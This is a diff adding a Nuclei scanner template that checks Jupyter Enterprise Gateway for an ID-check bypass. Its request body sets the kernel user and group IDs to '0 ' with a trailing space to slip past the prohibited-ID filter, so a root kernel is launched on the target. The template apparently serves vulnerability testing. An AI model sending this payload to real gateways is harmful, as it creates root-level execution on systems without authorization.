@@ -1,0 +1,31 @@
+id: jupyter-enterprise-gateway-id-bypass
+info:
+  name: Jupyter Enterprise Gateway ID Bypass
+  author: berney
+  severity: info
+
+http:
+  - id: bypass-id
+    method: POST
+    path:
+      - "{{BaseURL}}/api/kernels"
+    # Trailing space to bypass prohibited checks
+    body: |
+      {
+        "env": {
+          "KERNEL_POD_NAME": "bdawg-nuclei",
+          "KERNEL_NAMESPACE": "notebooks",
+          "KERNEL_UID": "0 ",
+          "KERNEL_GID": "0 "
+        }
+      }
+    matchers:
+      - type: status
+        status:
+          - 201
+    extractors:
+      - type: json
+        part: body
+        name: id
+        json:
+          - .id
